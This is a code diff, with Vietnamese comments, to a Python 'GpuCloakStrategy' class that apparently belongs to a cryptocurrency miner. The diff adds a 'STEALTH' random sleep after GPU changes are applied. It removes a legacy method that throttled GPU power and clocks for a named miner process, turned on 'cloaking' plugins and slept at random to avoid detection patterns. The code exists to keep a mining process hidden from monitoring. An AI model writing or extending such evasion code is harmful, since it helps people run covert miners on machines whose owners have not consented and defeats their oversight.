@@ -456,152 +456,21 @@ class GpuCloakStrategy:
             # 6️⃣ DELEGATE TO HARDWARE CONTROLLER WITH FALLBACK
             if self.hw_controller:
                 result = self._delegate_with_fallback(enhanced_params)
-                return result
             else:
                 # Fallback to direct GPU manager if no HardwareController
-                return self._direct_gpu_apply(enhanced_params)
+                result = self._direct_gpu_apply(enhanced_params)
+
+            # ✅ STEALTH: Random sleep sau khi áp dụng thành công
+            if result.get('success'):
+                self._apply_random_sleep_interval()
+            return result
                 
         except Exception as e:
             self.logger.error(f"❌ [INTELLIGENT] Coordination failed: {e}")
             if self.emergency_fallback:
                 return self._emergency_fallback_apply(request)
             return {'success': False, 'error': str(e)}
-    
-    def apply(self, process: MiningProcess) -> bool:
-        """
-        ✅ LEGACY: Giữ lại để backward compatibility
-        
-        :param process: Enhanced MiningProcess với classification metadata.
-        :return: bool - True nếu GPU cloaking áp dụng thành công, False nếu thất bại
-        """
-        try:
-            # ✅ ENHANCED SAFETY CHECK: Comprehensive GPU manager validation
-            if not self._validate_gpu_manager_runtime():
-                self.logger.error("💀 [SAFETY CHECK] GPU resource manager not ready – aborting gpu_cloaking apply")
-                self._log_gpu_manager_diagnostics()
-                return False
 
-            pid, name = process.pid, process.name
-
-            self.logger.info(f"🎮 [Unified GPU Cloaking] Processing {name} (PID={pid}) with integrated thermal control")
-
-            # --- CHỈ ÁP DỤNG CHO TIẾN TRÌNH ĐÚNG TÊN ĐƯỢC CẤU HÌNH ---
-            if self.allowed_process_name and name != self.allowed_process_name:
-                self.logger.debug(
-                    f"[GPU Cloaking] Bỏ qua tiến trình '{name}' (PID={pid}) do không khớp tên GPU trong config."
-                )
-                return True  # ✅ SUCCESS: Skipped by design, not an error
-
-            gpu_count = self.gpu_resource_manager.get_gpu_count()
-            if gpu_count == 0:
-                self.logger.warning("[GPU Cloaking] Hệ thống không có GPU. Bỏ qua cloaking.")
-                return True  # ✅ SUCCESS: Skipped due to no GPUs (not an error)
-
-            # Giới hạn power + set clocks cho mỗi GPU
-            for gpu_index in range(gpu_count):
-                current_pl = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
-                if current_pl is None:
-                    self.logger.error(f"[GPU Cloaking] Không thể lấy power limit cho GPU={gpu_index}.")
-                    continue
-
-                # Bỏ qua nếu công suất hiện tại đã thấp hơn 100W
-                if current_pl <= 100:
-                    self.logger.warning(f"[GPU Cloaking] GPU={gpu_index} => power={current_pl}W (PID={pid}).")
-                    continue
-                
-                desired_pl = int(round(current_pl * (1 - self.throttle_percentage / 100)))
-                
-                # Sử dụng privileged_manager nếu có cho GPU clock control
-                if self.privileged_manager:
-                    clock_success = self.privileged_manager.set_gpu_clock_limits(
-                        gpu_id=gpu_index,
-                        sm_clock=self.target_sm_clock,
-                        mem_clock=self.target_mem_clock
-                    )
-                    if clock_success:
-                        self.logger.info(f"🔐 [GPU Cloaking] Set clocks via privileged_manager for GPU={gpu_index}")
-                
-                ok_pl = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_pl)
-                if ok_pl:
-                    self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => power={desired_pl}W (PID={pid}).")
-                else:
-                    self.logger.error(f"[GPU Cloaking] Không thể giới hạn power limit cho GPU={gpu_index}.")
-
-            # ✅ UNIFIED: Integrated thermal management (không cần separate thread)
-            if self.enable_thermal_monitoring:
-                self._apply_integrated_thermal_management(pid, gpu_count)
-            
-            # ✅ ENHANCED: Activate GPU plugins for advanced cloaking features
-            plugin_success = self._activate_gpu_plugins(pid)
-            if plugin_success:
-                self.logger.info(f"🎮 [GPU PLUGINS] Enhanced cloaking features activated for PID={pid}")
-            else:
-                self.logger.warning(f"⚠️ [GPU PLUGINS] Running with basic cloaking only for PID={pid}")
-            
-            # ✅ STEALTH: Random sleep interval để tránh detection pattern
-            self._apply_random_sleep_interval()
-            
-            self.logger.info(f"✅ [Unified GPU Cloaking] Applied comprehensive GPU control for {name}(PID={pid})")
-            self.logger.info(f"   • Basic GPU controls: ✅ Applied")
-            self.logger.info(f"   • Plugin enhancements: {'✅ Active' if plugin_success else '⚠️ Inactive'}")
-            self.logger.info(f"   • Stealth interval: ✅ Applied")
-            
-            return True  # ✅ SUCCESS: GPU cloaking completed successfully
-
-        except psutil.NoSuchProcess as e:
-            # ✅ ERROR REPORTING: Process not found error
-            error_reporter.report_error(
-                ErrorCode.PROCESS_NOT_FOUND,
-                f"GPU Cloaking: Tiến trình không tồn tại: {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='GpuCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='GPU',
-                context_data={'process_name': process.name, 'error': str(e)},
-                exception=e
-            )
-            self.logger.error(f"GPU Cloaking: Tiến trình không tồn tại: {e}")
-            return False  # ✅ FAILURE: Process does not exist
-        except psutil.AccessDenied as e:
-            # ✅ ERROR REPORTING: Access denied error
-            error_reporter.report_error(
-                ErrorCode.PROCESS_ACCESS_DENIED,
-                f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='GpuCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='GPU',
-                context_data={'process_name': process.name, 'error': str(e)},
-                exception=e
-            )
-            self.logger.error(f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
-            return False  # ✅ FAILURE: Access denied
-        except Exception as e:
-            # ✅ ERROR REPORTING: General strategy application failure
-            error_reporter.report_error(
-                ErrorCode.STRATEGY_APPLICATION_FAILED,
-                f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}",
-                ErrorSeverity.HIGH,
-                module='cloak_strategies',
-                function='GpuCloakStrategy.apply',
-                process_id=process.pid,
-                strategy_name='GPU',
-                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
-                exception=e
-            )
-            self.logger.error(
-                f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            return False  # ✅ FAILURE: GPU cloaking failed
-            
-    def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục GPU - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
-        """
-        self.logger.info(f"[GPU RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
-    
     # ====================== INTELLIGENT COORDINATOR HELPER METHODS ======================
     
     def _apply_adaptive_thermal_logic(self, params: Dict[str, Any]) -> Dict[str, Any]:
